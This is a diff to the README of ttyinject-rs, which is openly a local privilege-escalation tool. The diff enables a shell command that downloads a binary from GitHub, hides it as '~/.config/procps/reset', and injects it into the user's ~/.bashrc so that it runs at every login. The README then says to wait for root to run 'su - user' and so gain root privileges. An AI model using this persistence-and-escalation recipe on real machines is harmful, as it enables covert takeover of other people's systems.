@@ -34,17 +34,18 @@ Taken verbatim from [ttyinject](https://github.com/hackerschoice/ttyinject)'s RE
 
 ## Usage
 
-TODO
-
 Deploy ttyinject-rs in the user's `~/.bashrc` as follows:
 
 ```sh
 mkdir -p ~/.config/procps 2>/dev/null
-#curl -o ~/.config/procps/reset -fsSL "https://github.com/0xdea/ttyinject/releases/download/latest/ttyinject-linux-$(uname -m)" \
-#&& chmod 755 ~/.config/procps/reset \
-#&& if grep -qFm1 'procps/reset' ~/.bashrc; then echo >&2 "Already installed in ~/.bashrc"; else \
-#echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
+curl -o ~/.config/procps/reset -fsSL "https://github.com/0xdea/ttyinject-rs/releases/latest/download/ttyinject-rs-linux-$(uname -m)" \
+&& chmod 755 ~/.config/procps/reset \
+&& if grep -qFm1 'procps/reset' ~/.bashrc; then echo >&2 "Already installed in ~/.bashrc"; else \
+echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
 ```
+
+> [!TIP]
+> Alternatively, you can grab the binary from [crates.io](https://crates.io/crates/ttyinject-rs) via `cargo install ttyinject-rs` or compile it from source.
 
 Then, wait for root to execute `su - user` and thereafter gain root privileges with:
 
